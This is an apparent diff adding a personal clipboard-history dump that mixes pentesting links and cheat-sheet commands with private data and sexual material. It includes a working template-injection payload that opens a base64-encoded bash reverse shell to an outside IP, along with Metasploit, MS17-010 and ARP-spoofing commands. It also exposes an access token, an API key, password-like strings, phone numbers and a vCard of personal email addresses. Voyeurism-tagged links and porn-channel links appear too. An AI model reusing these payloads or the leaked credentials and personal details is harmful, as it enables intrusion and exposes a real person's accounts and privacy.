@@ -1,0 +1,1297 @@
+Clip Stack Backup 
+
+Sat Sep 23 03:04:00 PDT 2023
+https://github.com/koutto/pi-pwnbox-rogueap/wiki/MitM-Commands
+
+https://github.com/koutto/pi-pwnbox-rogueap/wiki
+
+https://duckduckgo.com/?q=dehashed&t=fpas&ia=web
+
+https://tryhackme.com/room/sqlilab
+
+https://tryhackme.com/hacktivities?page=1&free=all&order=most-popular&difficulty=all&type=all#learning-paths
+
+https://tryhackme.com/paths
+
+https://tryhackme.com/paths
+
+https://tryhackme.com/paths
+
+https://tryhackme.com/room/vulnversity
+
+https://tryhackme.com/module/snort
+
+http://www.pentest-standard.org/index.php/Intelligence_Gathering#Network_blocks_owned_.28L1.29
+
+https://resources.infosecinstitute.com/topics/penetration-testing/penetration-testing-methodologies-and-standards/
+
+https://cfp.bsidespdx.org/bsidespdx-2023/talk/review/KWMEX7AJ7EBD9K9VDLVMBJHKH9X3MRDN
+
+http://bsidespdx.org/events/2023/schedule
+
+https://m.soundcloud.com/queed-inc/execution-flow
+
+https://m.soundcloud.com/ytcracker/ytcracker-wiresharkseauxleaux
+
+https://genius.com/Ytcracker-git-init-lyrics
+
+https://github.com/Ignitetechnologies/Mindmap
+
+https://github.com/Ignitetechnologies/Command-Control
+
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+https://github.com/Ignitetechnologies/myfiles
+
+https://github.com/Ignitetechnologies/Web-Application-Cheatsheet
+
+https://github.com/Ignitetechnologies/bugbounty
+
+https://github.com/Ignitetechnologies/Android-Penetration-Testing
+
+https://github.com/Ignitetechnologies/Wireless-Penetration-Testing
+
+https://github.com/Ignitetechnologies/TryHackMe-CTF-Writeups
+
+https://www.hackingarticles.in/retro-tryhackme-walkthrough/
+
+https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups
+
+https://github.com/Ignitetechnologies/Linux-Privilege-Escalation
+
+https://github.com/Ignitetechnologies/MSSQL-Pentest-Cheatsheet
+
+https://github.com/Ignitetechnologies/Windows-Privilege-Escalation
+
+https://github.com/Ignitetechnologies/Privilege-Escalation
+
+https://github.com/Ignitetechnologies/Nmap-For-Pentester
+
+https://github.com/Ignitetechnologies/Credential-Dumping
+
+https://github.com/Ignitetechnologies/CTF-Difficulty
+
+https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups
+
+https://github.com/Ignitetechnologies/HackTheBox-CTF-Writeups
+
+https://github.com/Ignitetechnologies/BurpSuite-For-Pentester
+
+https://github.com/Ignitetechnologies/Privilege-Escalation
+Sat Sep 23 03:02:06 PDT 2023
+https://centralops.net/co/domaindossier.aspx
+Sat Sep 23 02:59:34 PDT 2023
+Burp Spider is a tool for automatically crawling web applications.
+Sat Sep 23 02:59:08 PDT 2023
+Black Widow
+
+This Web spider utility detects and displays detailed information
+Sat Sep 23 02:58:21 PDT 2023
+httrack http://tptl.in –O /root/Desktop/file
+Sat Sep 23 02:58:05 PDT 2023
+Httrack
+
+HTTrack is a free and open source Web crawler
+Sat Sep 23 02:57:23 PDT 2023
+scan for SMB vulnerability for MS17-010 using NMAP script 
+
+nmap -T4 -p445 --script smb-vuln-ms17-010 192.168.1.106
+
+
+msf > use auxiliary/scanner/smb/smb_ms17_010
+msf auxiliary(smb_ms17_010) > set rhosts 192.168.1.106
+msf auxiliary(smb_ms17_010) > set lhost 192.168.1.104
+msf auxiliary(smb_ms17_010) > set rport 445
+msf auxiliary(smb_ms17_010) > exploit
+
+
+Sat Sep 23 02:56:56 PDT 2023
+scan for SMB vulnerability for MS17-010 using NMAP script 
+
+nmap -T4 -p445 --script smb-vuln-ms17-010 192.168.1.106
+Sat Sep 23 02:56:38 PDT 2023☆★☆
+Metasploit - auxiliary module web crawler
+
+use auxiliary/crawler/msfcrawler
+msf auxiliary(msfcrawler) > set rhosts www.example.com
+msf auxiliary(msfcrawler) > exploit
+Sat Sep 23 02:53:33 PDT 2023
+scan for SMB vulnerability for MS17-010 using NMAP script 
+Sat Sep 23 02:51:58 PDT 2023
+Web Data Extractor Pro is a web scraping tool specifically designed for mass-gathering of various data types. It can harvest URLs, phone and fax numbers, email addresses, 
+Sat Sep 23 02:50:21 PDT 2023
+BuiltWith.com
+Sat Sep 23 02:48:55 PDT 2023
+
+
+You get signal: it is also an online tool used for DNS footprinting as well as for Network footprinting
+
+A reverse IP domain check takes a domain name or IP address pointing to a web server and searches for other sites known to be hosted on that same web server.
+Sat Sep 23 02:47:09 PDT 2023
+Domain Dossier
+Sat Sep 23 02:43:59 PDT 2023
+steghide extract -sf butler-1.jpg
+ls | grep secrets.zip
+Sat Sep 23 02:39:53 PDT 2023
+Upgrading Shell to Meterpreter
+sessions 
+session -u 1 
+sessions
+Sat Sep 23 02:39:41 PDT 2023
+sessions
+session -u 1
+sessions
+Sat Sep 23 02:39:10 PDT 2023
+Kill All Sessions
+sessions -K
+Sat Sep 23 02:38:39 PDT 2023
+Extended Session Details
+sessions -x
+Sat Sep 23 02:38:03 PDT 2023
+Killing a Particular Session
+sessions 
+session -k 4 
+sessions
+Sat Sep 23 02:37:37 PDT 2023
+sessions
+session -k 4
+sessions
+Sat Sep 23 02:36:58 PDT 2023
+Concurrent Meterpreter Commands
+sessions -C screenshot -i 2,3
+Sat Sep 23 02:35:45 PDT 2023
+sessions 2
+systeminfo
+sessions 3
+systeminfo
+Sat Sep 23 02:35:23 PDT 2023
+list all the active sessions
+sessions -l
+Sat Sep 23 02:34:24 PDT 2023
+sessions -v
+Sat Sep 23 02:34:14 PDT 2023
+sessions -c "net user" -i 2,3
+Sat Sep 23 02:33:09 PDT 2023
+xfreerdp /u:wade /p:parzival /v:10.10.167.18
+Sat Sep 23 02:32:36 PDT 2023
+dirb http://10.10.167.18/ /usr/share/dirb/wordlists/big.txt
+Sat Sep 23 02:29:44 PDT 2023
+https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/
+Sat Sep 23 02:29:07 PDT 2023
+"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMC80NDMgMD4mMSIK | base64 -d | bash')\")()}}"
+Sat Sep 23 02:28:33 PDT 2023
+echo 'bash -c "bash -i >& /dev/tcp/10.10.14.30/443 0>&1"' | base64
+Sat Sep 23 02:27:53 PDT 2023
+
+Server-Side Template Injection (SSTI) Exploitation
+Sat Sep 23 02:25:05 PDT 2023
+Reconnaissance
+Sat Sep 23 02:23:43 PDT 2023
+https://github.com/koutto/pi-pwnbox-rogueap/wiki/MitM-Commands
+
+https://github.com/koutto/pi-pwnbox-rogueap/wiki
+
+https://duckduckgo.com/?q=dehashed&t=fpas&ia=web
+
+https://tryhackme.com/room/sqlilab
+
+https://tryhackme.com/hacktivities?page=1&free=all&order=most-popular&difficulty=all&type=all#learning-paths
+
+https://tryhackme.com/paths
+
+https://tryhackme.com/paths
+
+https://tryhackme.com/paths
+
+https://tryhackme.com/room/vulnversity
+
+https://tryhackme.com/module/snort
+
+http://www.pentest-standard.org/index.php/Intelligence_Gathering#Network_blocks_owned_.28L1.29
+
+https://resources.infosecinstitute.com/topics/penetration-testing/penetration-testing-methodologies-and-standards/
+
+https://www.infosecinstitute.com/courses/instant-pricing/
+
+https://cfp.bsidespdx.org/bsidespdx-2023/talk/review/KWMEX7AJ7EBD9K9VDLVMBJHKH9X3MRDN
+
+http://bsidespdx.org/events/2023/schedule
+
+https://m.soundcloud.com/queed-inc/execution-flow
+
+https://m.soundcloud.com/ytcracker/ytcracker-wiresharkseauxleaux
+
+https://genius.com/Ytcracker-git-init-lyrics
+
+https://github.com/Ignitetechnologies/Mindmap
+
+https://github.com/Ignitetechnologies/Command-Control
+
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
+https://github.com/Ignitetechnologies/myfiles
+
+https://github.com/Ignitetechnologies/Web-Application-Cheatsheet
+
+https://github.com/Ignitetechnologies/bugbounty
+
+https://github.com/Ignitetechnologies/Android-Penetration-Testing
+
+https://github.com/Ignitetechnologies/Wireless-Penetration-Testing
+
+https://github.com/Ignitetechnologies/TryHackMe-CTF-Writeups
+
+https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups
+
+https://github.com/Ignitetechnologies/Linux-Privilege-Escalation
+
+https://github.com/Ignitetechnologies/MSSQL-Pentest-Cheatsheet
+
+https://github.com/Ignitetechnologies/Windows-Privilege-Escalation
+
+https://github.com/Ignitetechnologies/Privilege-Escalation
+
+https://github.com/Ignitetechnologies/Nmap-For-Pentester
+
+https://github.com/Ignitetechnologies/Credential-Dumping
+
+https://github.com/Ignitetechnologies/CTF-Difficulty
+
+https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups
+
+https://github.com/Ignitetechnologies/HackTheBox-CTF-Writeups
+
+https://github.com/Ignitetechnologies/BurpSuite-For-Pentester
+
+https://github.com/Ignitetechnologies/Privilege-Escalation
+Sat Sep 23 02:19:28 PDT 2023
+github.com/Ignitetechnolo
+Sat Sep 23 02:12:03 PDT 2023
+github.com/dionach/CMSmap
+
+Sat Sep 23 02:08:43 PDT 2023
+#analsquirting
+Sat Sep 23 01:20:18 PDT 2023
+Homeland Threat Assessment 2024
+Fri Sep 22 22:07:27 PDT 2023
+ Event address
+
+1825 Southwest Broadway
+
+Third Floor, Room 338
+
+Portland, OR 97201
+
+Copy address 
+Fri Sep 22 21:26:08 PDT 2023☆★☆
+@Xe1phix_Portland
+Fri Sep 22 21:24:20 PDT 2023☆★☆
+@xe1phix_other
+Fri Sep 22 21:18:09 PDT 2023☆★☆
+@Xe1phix_Tempz
+Fri Sep 22 21:07:27 PDT 2023☆★☆
+Xe1phix-Other Tox ID:
+DF4B8EE892F0AD9D27873F2F86F049C712F8139992CCF5F060B525D37F4A4818EB7D3B067D43
+Fri Sep 22 21:05:58 PDT 2023☆★☆
+Xe1phix-Other Session ID:
+0578e38ef8ef39846277390e5326f95db2f917633321f1e41eff5b338050870479
+Fri Sep 22 21:02:56 PDT 2023
+0578e38ef8ef39846277390e5326f95db2f917633321f1e41eff5b338050870479
+Fri Sep 22 19:52:09 PDT 2023
+mitmproxyAn interactive man-in-the-middle HTTP proxy.
+See also: mitmweb.
+More information: https://docs.mitmproxy.org/stable/concepts-options .Start mitmproxy with default settings:mitmproxyStart mitmproxy bound to a custom address and port:mitmproxy --listen-host {{ip_address}} --listen-port {{port}}Start mitmproxy using a script to process traffic:mitmproxy --scripts {{path/to/script.py}}Export the logs with SSL/TLS master keys to external programs (wireshark, etc.):SSLKEYLOGFILE="{{path/to/file}}" mitmproxy
+Fri Sep 22 19:49:24 PDT 2023
+arpspoofForge ARP replies to intercept packets.
+More information: https://monkey.org/~dugsong/dsniff .Poison all hosts to intercept packets on [i]nterface for the host:sudo arpspoof -i {{wlan0}} {{host_ip}}Poison [t]arget to intercept packets on [i]nterface for the host:sudo arpspoof -i {{wlan0}} -t {{target_ip}} {{host_ip}}Poison both [t]arget and host to intercept packets on [i]nterface for the host:sudo arpspoof -i {{wlan0}} -r -t {{target_ip}} {{host_ip}}
+Fri Sep 22 19:20:04 PDT 2023
+Xe1phix-Divergence Briar ID:
+
+briar://ac46wbr2vgb45naazxiikqp5am4tk77ivkqtz6spw7wpm2zniodt4
+Fri Sep 22 19:20:00 PDT 2023
+Xe1phix-Divergence Tox ID:
+
+B535AAF211C8CB2518266475A53AFA9F000685FA46A1BD8F76E1C50FAF0F656C6C26D2B55F10
+Sun Sep 17 05:46:18 PDT 2023
+API Keys:
+
+   1.  **bing_api** _(optional $$$)_ - Sign up [here](http://datamarket.azure.com/dataset/bing/search) (I chose the free plan), agree to all the terms until you get to "Thank You", then go [here](https://datamarket.azure.com/account/keys) to view the key. (free account: 5000 transactions per month)
+
+   2. **builtwith_api** - Go [here](https://api.builtwith.com/) and sign up.  Once you enter an email and password, it will show you the API key
+
+   3. **censysio_id** - Go [here](https://censys.io/register) and sign up. Once you register, confirm your account by clicking on the link in the email. Then login and go [here](https://censys.io/account) to view the "ID" and "Secret"
+
+   4. **censysio_secret** - Look at #3
+
+   5. **facebook_api** - This one is a bit more in-depth.  Click [here](https://developers.facebook.com/), login to Facebook (or register if you don't have one).  Once logged in, in the top-right, click "My Apps", then "Add a new app". Click the "Add a new app" green button.  Type any name you want and select any category.  This will create a new app, now click "Dashboard" in the top left.  Copy the "App ID" and "App Secret" from that page. For this field, you want to use "App ID"
+
+   6. **facebook_password** - _Note: Due to order of the API keys, this does not have to do with #5 above!_ This is simply your facebook password.  Or make a new facebook and use that password!
+
+   7. **facebook_secret** - This is the "App Secret" from #5
+
+   8. **facebook_username** - This is your facebook username that has the password listed in #6.  Make a new facebook account if you want
+
+   9. **flickr_api** - Go [here](https://www.flickr.com/services/apps/create/) and click "Request an API Key" under "Get your API key".  Login to Yahoo (or make an account).  If you had to create a Yahoo/Flickr account, you may need to [click the link again](https://www.flickr.com/services/apps/create/) after registering.  Choose "Apply for non-commercial key".  Fill in some filler information (it really doesn't matter what you put here).  Then you will get an "API Key" and "Secret".  Use "API Key" for this entry (_Note: Untested, don't know if you need "Secret" too or what. Open bug report [here](https://bitbucket.org/LaNMaSteR53/recon-ng/issues/189/flickr-api-key-option))_
+
+   10. **fullcontact_api** _(optional $$$)_- Go [here](https://www.fullcontact.com/developer/) and click "Get a key". Sign up.  You will be shown an API key immediately after signing up (free account: 500 Person and Company matches per month, and 60 queries per minute)
+
+   11. **github_api** - Go [here](https://github.com/settings/tokens) (login if necessary, then click the link). Click "Generate new token" in the top right corner.  You don't need to give the token any permissions (and I recommend that you don't), just click "Generate Token".  You will be shown the token
+
+   12. **google_api** _(optional $$$)_ - Go [here](https://console.developers.google.com/apis/library) (login if necessary). At the top left, click the dropdown "Project", then "Create project". Enter a project name, then hit "Create". Once the project is created, go [here](https://console.developers.google.com/apis/credentials) and click "Create Credentials" and select "API Keys". It displays the key to use here.  Click "close" after you save it, _not "Restrict Key"._Then go to"Library" on the left, click "Custom Search API" (bottom-ish), and click "Enable". Done! (free account: 100 search queries per day for free)
+
+   13. **google_cse** - Go [here](https://cse.google.com/cse/all) (login if necessary).  Click "Create", enter "www.google.com" with "Sites to search", then click "Create" button.  On the next page, click "Control Panel".  Under "Sites to search", choose "Search the entire web but emphasize included sites" in the dropdown, then click the "Update" button at the bottom.  On the same page, scroll up and click "Search Engine ID" under "Details".  Thats the key to use here!
+
+   14. **hashes_api** - Register [here](https://hashes.org/register_form.php) (or login).  Confirm your account via
+Sun Sep 17 05:45:25 PDT 2023☆★☆
+Creep-[Sexual-Harassment]
+Sun Sep 17 05:44:35 PDT 2023☆★☆
+https://hashes.org/register_form.php
+Sun Sep 17 05:41:51 PDT 2023
+#TikTok
+Sun Sep 17 05:41:44 PDT 2023☆★☆
+#StripTeasing
+Sun Sep 17 05:37:32 PDT 2023☆★☆
+#fullscene
+Sun Sep 17 05:35:00 PDT 2023
+https://t.me/FuckinAss/112929
+Sun Sep 17 05:25:50 PDT 2023☆★☆
+#AnalSolo
+Sun Sep 17 05:25:42 PDT 2023☆★☆
+#AnalSquirt
+Sun Sep 17 04:55:11 PDT 2023
+https://t.me/+Zd2uH4y_4Zw3NWVh
+Sun Sep 17 04:45:52 PDT 2023
+https://youtu.be/gkSOpmchJiM?si=OSKXa4hvS6-HtSnX
+Sun Sep 17 04:34:50 PDT 2023
+https://youtube.com/watch?v=FTvQgbAQAz8&si=I-f7vtjlLXrFp-V9
+Sun Sep 17 04:04:54 PDT 2023☆★☆
+https://player.fm/series/pauls-security-weekly-70666
+Sun Sep 17 04:04:08 PDT 2023
+https://player.fm/podcasts/jupiter-broadcasting
+Sun Sep 17 04:04:02 PDT 2023☆★☆
+https://player.fm/series/linux-action-news-2434932
+Sun Sep 17 04:03:52 PDT 2023☆★☆
+https://player.fm/series/darknet-diaries-2000363
+Sun Sep 17 04:03:40 PDT 2023☆★☆
+https://player.fm/series/cyberwire-daily-112238
+Sun Sep 17 03:53:25 PDT 2023
+https://t.me/addstickers/Jeo_by_stickermaker1122_bot
+Sun Sep 17 03:52:08 PDT 2023
+https://t.me/Sexy_Stickers_Chat
+Sun Sep 17 03:51:05 PDT 2023
+https://t.me/addstickers/vpack_1047721635_by_VideoStickerXBot
+Sat Sep 16 10:30:02 PDT 2023
+TouchDroid (Use your Android Device as Touchpad.)
+https://f-droid.org/packages/com.akshayaap.touchdroid/
+Sat Sep 16 04:27:09 PDT 2023
+https://github.com/bobrofon/easysshfs
+
+https://gitlab.com/sirekanyan.org/warmongr
+
+https://github.com/celzero/rethink-app
+
+https://keyoxide.org/
+
+https://github.com/Gedsh/InviZible
+
+https://cfp.bsidespdx.org/bsidespdx-2023/me/submissions/GDYR3B/
+
+https://github.com/0xor0ne
+
+https://www.linkedin.com/messaging
+
+https://en.m.wikipedia.org/wiki/Acetylcholine
+
+https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Cholinergic_synapse.svg/440px-Cholinergic_synapse.svg.png
+
+https://en.m.wikipedia.org/wiki/Acetylcholinesterase
+
+https://en.m.wikipedia.org/wiki/File:Cholinergic_synapse.svg
+
+https://en.m.wikipedia.org/wiki/Nicotinic_acetylcholine_receptor
+
+https://en.m.wikipedia.org/wiki/Ligand-gated_ion_channel
+
+https://en.m.wikipedia.org/wiki/Neuromodulation
+
+https://en.m.wikipedia.org/wiki/Parasympathetic_nervous_system
+
+https://en.m.wikipedia.org/wiki/Action_potential
+Fri Sep 15 23:26:02 PDT 2023☆★☆
+Xe1phix-[Matrix]-[Element]-[Access-Token]:
+
+syt_eGUxcGhpeA_qdYTzbzzJZrgbhWxpZeu_3gfR9s
+Fri Sep 15 23:25:44 PDT 2023☆★☆
+Xe1phix-[Matrix]-[Element]-[Access-Token]
+Fri Sep 15 23:22:49 PDT 2023☆★☆
+TESPEDJWPO
+Fri Sep 15 23:15:16 PDT 2023☆★☆
+gwsjAGEa3GrrLV2uTHGfoOoMrFKnSV4MSX9uzqon3S4
+Fri Sep 15 23:05:42 PDT 2023☆★☆
+y=}m|2{mbnSPGp
+Fri Sep 15 20:34:29 PDT 2023
+https://youtube.com/watch?v=nSU5iRZFMCc&si=jfJ332FcK5a9pjTU
+Fri Sep 15 20:31:08 PDT 2023
+ate each type of receptor without activating the other: muscarine is a compound found in the mushroom Amanita muscaria
+Fri Sep 15 20:29:33 PDT 2023
+There are two main classes of acetylcholine receptor, nicotinic and muscarinic. 
+Fri Sep 15 20:29:00 PDT 2023
+Acetylcholine processing in a synapse. After release acetylcholine is broken down by the enzyme acetylcholinesterase.
+
+Like many other biologically active substances, acetylcholine exerts its effects by binding to and activating receptors located on the surface of cells. 
+Fri Sep 15 12:01:07 PDT 2023
+https://youtu.be/ztlZq_qqu-4?si=v8fzTXBcy2DBb84l
+Fri Sep 15 10:29:53 PDT 2023
+email link. Login with your new account, then click [here](https://hashes.org/settings.php). Your API key should be listed.
+
+   15. **instagram_api** - Register [here](https://www.instagram.com/accounts/login/?next=%2Fdeveloper%2Fregister%2F) (or login). Once logged in, click [here](http://instagram.com/developer/clients/register/) and create a new application. Add "http://localhost:31337" as the "OAuth redirect_uri". Click "Manage Clients" at the top of the screen and the API key will be available as the "CLIENT_ID" _(Note: Instagram wasn't functioning when I wrote this...it may be different)_
+
+   16. **instagram_secret** - Same as #15 but its "CLIENT_SECRET"
+
+   17. **ipinfodb_api** - Register [here](http://www.ipinfodb.com/register.php). You must enter the IP you will use recon-ng from under "Server IP".  I recommend you use a VPN or server or something so the IP never changes.  Activate the account via email link.  The api key will be given to you on account activation
+
+   18. **jigsaw_api** _(Requires $$$)_ - Register [here](https://connect.data.com/registration/signup).  Once registered, you must send a special request to get an API key.  No specifics here because its very _expensive!_.
+
+   19. **jigsaw_password** _(Requires $$$)_ - Register [here](https://connect.data.com/registration/signup).  This is the password for your account that you create and sign up for a plan with!
+
+   20. **jigsaw_username** _(Requires $$$)_ - Same as #19, but this is the account password.
+
+   21. **linkedin_api** - Go [here](https://www.linkedin.com/secure/developer) (register/login if necessary) and click "Create Application". Fill out the information with random stuff...annoyingly it requires an image with the same width and height.  I used [this](https://upload.wikimedia.org/wikipedia/commons/thumb/0/0d/Ski_trail_rating_symbol-blue_square.svg/600px-Ski_trail_rating_symbol-blue_square.svg.png). It will show you the "Client ID", which is this key. Add "http://localhost:31337" under "OAuth 2.0".  Check all the boxes under "Default Application Permissions".  Click "Update". _For this API to function fully, you must submit [this form](https://www.linkedin.com/help/linkedin/ask/API-DVR)_. Fill out information explaining what you will use it for, etc.  Pain in the butt, but necessary.
+
+   22. **linkedin_secret** - Same as #21, but its the "Client Secret"
+
+   23. **pwnedlist_api** - Service has been officially shut down
+
+   24. **pwnedlist_iv** - Service has been officially shut down
+
+   25. **pwnedlist_secret** - Service has been officially shut down
+
+   26. **shodan_api** _(optional $$$)_- Login or register [here](https://account.shodan.io/login).  Activate your account via email.  The API key will be shown upon login. (free account: basic search capabilities. Premium account with full access is a one-time payment of $50 and pretty worth it)
+
+   27. **twitter_api** - Go [here](https://apps.twitter.com/) and login/register as needed. Click "Create New App".  Enter in filler information of your app.  Once the application is created, click on "manage keys and access tokens".  The key is "Consumer Key (API Key)".
+
+   28. **twitter_secret** - Same as #27, but the key is "Consumer Secret (API Secret)"
+
+   29. **virustotal_api** _(If using a branch with it)_ - Go [here](https://www.virustotal.com/) and click "Join our community" in the top right.  Active the account via email, then login.  Click your username in the top right, then click "My API Key". The API key will be shown. A "public" API will be sufficient.
+
+
+
+Wed Sep 21 00:34:07 PDT 2022
+Element Android
+Wed Sep 21 00:21:02 PDT 2022
+https://accounts.censys.io/register
+Wed Sep 21 00:10:52 PDT 2022
+Xe1phix-[CertSpotter]-API-Key.txt
+Wed Sep 21 00:10:02 PDT 2022
+Certspotter-API-Key
+Wed Sep 21 00:08:32 PDT 2022
+API Key
+Name: Xe1phix-API
+Key: k46673_k07a5xTOEWiIuV00EF6e
+Wed Sep 21 00:05:28 PDT 2022☆★☆
+xe1phix@protonmail.com
+Tue Sep 20 23:55:30 PDT 2022
+https://api.hackertarget.com
+Tue Sep 20 23:53:27 PDT 2022
+https://api.certspotter.com
+Fri Sep 15 10:29:17 PDT 2023
+https://t.me/xe1phix_tempz
+@Xe1phix_Tempz
+@Xe1phix_portland
+(971)-724-7737
+Fri Sep 15 10:28:43 PDT 2023
+Xe1phix-Tempz
+Session ID:
+0594f3dad53efe10ac962f2bff1025e865e0327e309b6e88f35e7e99ac69192c3e
+Fri Sep 15 10:27:50 PDT 2023
+https://t.me/Xe1phixIRCBot
+
+@Xe1phixIRCBot
+
+@Xe1phixIRCBot
+Fri Sep 15 10:27:20 PDT 2023
+https://soundcloud.com/xe1phix/sets/nerdcore
+Fri Sep 15 10:27:09 PDT 2023
+https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4217602/
+Fri Sep 15 10:26:57 PDT 2023
+https://m.youtube.com/watch?v=CktSB9CJcW4&list=PLzY7A_xYbG23xtLDeYGtgOuYHJ8WXQecu&index=21
+Fri Sep 15 10:26:52 PDT 2023
+https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/
+Fri Sep 15 10:26:47 PDT 2023
+https://m.psychonautwiki.org/team/properties.asc.txt
+https://m.psychonautwiki.org/team/properties.asc.txt
+
+Statistics - PsychonautWiki
+https://m.psychonautwiki.org/wiki/Special:Statistics
+
+Create account - PsychonautWiki
+https://m.psychonautwiki.org/w/index.php?title=Special:CreateAccount&returnto=Main_Page&warning=mobile-frontend-generic-login-new
+
+https://m.psychonautwiki.org/wiki/Network#Forums
+
+Network - PsychonautWiki
+https://m.psychonautwiki.org/wiki/Network
+Fri Sep 15 10:26:36 PDT 2023
+## -------------------------------------------- ##
+##  [+] Matrix Users
+## -------------------------------------------- ##
+@xe1phix:marix.org
+@xe1phix-temp:marix.org
+@parrotsec-kiosk:matrix.org
+Fri Sep 15 10:26:29 PDT 2023
+https://www.tripsit.me/
+
+http://wiki.bluelight.org/index.php/Main_Page
+Fri Sep 15 10:26:22 PDT 2023
+https://m.youtube.com/watch?v=tO2grVDM40c
+Fri Sep 15 10:26:17 PDT 2023
+https://m.youtube.com/watch?v=GJb5_9CRAvU
+Fri Sep 15 10:26:13 PDT 2023
+#Xe1phix-[Freenode]-IRC-Relay:matrix.org
+
+https://matrix.to/#/@freenode_xe1phix:matrix.org
+
+@xe1phix:marix.org
+
+@xe1phix-temp:marix.org
+
+@parrotsec-kiosk:matrix.org
+
+@Shute-Park-Vagrants-Collective:matrix.org
+Fri Sep 15 10:25:47 PDT 2023
+BEGIN:VCARD VERSION:4.0 PRODID;TYPE=text;VALUE=TEXT:ez-vcard 0.11.3 FN;PREF=1:xe1phix UID:proton-autosave-aa7ed94d-d90a-4866-b43d-3e0c899a4f8b ITEM1.EMAIL;TYPE=email;PREF=1:xe1phix@protonmail.ch ITEM2.EMAIL;TYPE=email;PREF=2:ParrotSec-Kiosk@protonmail.com ITEM3.EMAIL;TYPE=email;PREF=3:markrobertcurry@protonmail.com ITEM4.EMAIL;TYPE=email;PREF=4:xe1phix@gmail.com ITEM5.EMAIL;TYPE=email;PREF=5:markrobertcurry@gmail.com ITEM6.EMAIL;TYPE=email;PREF=6:xe1phix@aim.com ITEM7.EMAIL;TYPE=email;PREF=7:thecheezeman27@aim.com ITEM8.EMAIL;TYPE=email;PREF=8:theothercheeze2@aim.com ITEM9.EMAIL;TYPE=email;PREF=9:markx.curry@intel.com ITEM10.EMAIL;TYPE=email;PREF=10:currym@opusinteractive.com ITEM11.EMAIL;TYPE=email;PREF=11:xe1phix.shute@gmail.com ITEM12.EMAIL;TYPE=email;PREF=12:xe1phix@mail.i2p ITEM13.EMAIL;TYPE=email;PREF=13:xe1phix@bitmessage.org ITEM14.EMAIL;TYPE=email;PREF=14:markrobertcurry@outlook.com ITEM15.EMAIL;PREF=15:xe1phix-tempz@protonmail.com END:VCARD
+Fri Sep 15 10:25:09 PDT 2023
+https://t.me/Xe1phix_Telegram_QRCodes
+Fri Sep 15 10:25:00 PDT 2023
+Hey, talk to me on Element: https://matrix.to/#/@xe1phix-temp:matrix.org
+Fri Sep 15 10:24:52 PDT 2023
+Discord
+https://discord.com/invite/aqcDKzVYw3
+Fri Sep 15 10:24:47 PDT 2023
+• Discord | #telegram-feed | VX Feed
+https://discord.com/channels/1002774831961481247/1002802463067340860
+Fri Sep 15 10:24:27 PDT 2023
+https://matrix.to/#/!SFiKwabAvWLPBNRYDj:matrix.org?via=matrix.org
+
+https://matrix.to/#/@xe1phix:matrix.org
+
+https://matrix.to/#/@freenode_xe1phix:matrix.org
+
+@freenode_xe1phix:matrix.org
+
+https://matrix.to/#/#Xe1phix-[Freenode]-IRC-Relay:matrix.org
+
+https://matrix.to/#/@xe1phix-temp:matrix.org
+
+#Xe1phix-[Freenode]-IRC-Relay:matrix.org
+
+https://matrix.to/#/@freenode_xe1phix:matrix.org
+
+@xe1phix:marix.org
+
+@xe1phix-temp:marix.org
+
+@parrotsec-kiosk:matrix.org
+
+@Shute-Park-Vagrants-Collective:matrix.org
+Fri Sep 15 10:15:58 PDT 2023☆★☆
+#Creep-[Voyeurism]
+Fri Sep 15 10:00:59 PDT 2023☆★☆
++19717247737
+Fri Sep 15 10:00:22 PDT 2023☆★☆
++15155986118
+Fri Sep 15 09:43:56 PDT 2023
+https://commoncrawl.org/get-started
+Fri Sep 15 09:43:47 PDT 2023☆★☆
+https://dashboard.clearbit.com/integrate
+Fri Sep 15 09:43:42 PDT 2023☆★☆
+https://community.riskiq.com/login
+Fri Sep 15 09:43:37 PDT 2023☆★☆
+https://www.onyphe.io/signup
+Fri Sep 15 09:43:24 PDT 2023☆★☆
+https://www.farsightsecurity.com/grant-access
+Fri Sep 15 09:42:53 PDT 2023☆★☆
+moz-extension://9e7005b9-2368-453b-8f1b-7e0dbb5c3587/dashboard.html
+Fri Sep 15 09:42:37 PDT 2023☆★☆
+https://github.com/koutto/pi-pwnbox-rogueap/wiki/MitM-Commands
+Fri Sep 15 09:42:19 PDT 2023☆★☆
+https://player.fm/series/the-jordan-b-peterson-podcast
+Fri Sep 15 09:42:14 PDT 2023☆★☆
+https://player.fm/series/huberman-lab
+Fri Sep 15 09:41:30 PDT 2023☆★☆
+https://status.fullcontact.com/
+Fri Sep 15 09:41:23 PDT 2023☆★☆
+https://fullhunt.io/user/settings/
+Fri Sep 15 09:41:16 PDT 2023☆★☆
+https://hunter.io/api-keys
+Fri Sep 15 09:41:09 PDT 2023☆★☆
+https://ipstack.com/dashboard
+Fri Sep 15 09:41:04 PDT 2023☆★☆
+https://networksdb.io/account
+Fri Sep 15 09:40:59 PDT 2023☆★☆
+https://www.neutrinoapi.com/account/keys/
+Fri Sep 15 09:40:38 PDT 2023☆★☆
+https://github.com/smicallef/spiderfoot
+Fri Sep 15 09:40:26 PDT 2023
+woman-being-sexualized-in-public
+Fri Sep 15 09:40:10 PDT 2023☆★☆
+https://mail.proton.me/u/3/inbox
+Fri Sep 15 09:39:56 PDT 2023☆★☆
+https://gitlab.com/xe1phix/ParrotLinux-Public-Kiosk-Project
+Fri Sep 15 09:35:33 PDT 2023
+
+...
+Anonymous
+AI DEGENerated Art and Porn 08/31/23(Thu)23:16:40 No.905343774
+Image
+1683179850101440.jpg
+580 KB JPG
+
+    twintails edition
+
+    Previous thread: >>905340095
+
+    >>> OG Guide <<<
+    https://rentry.org/voldy
+
+    >>> Links with more links (ctrl+f to find almost anything) <<<
+    https://rentry.org/sdg-link
+    https://rentry.org/rentrysd
+
+    >> (New!) Bonus artist links <<
+    https://rentry.org/sdgoldmine#artist-comparisons
+    https://rentry.org/artists_sd-v1-4
+
+    >>> Local install <<<
+    Automatic1111: https://github.com/automatic1111/stable-diffusion-webui
+    ComfyUI (Node-based): https://rentry.org/comfyui
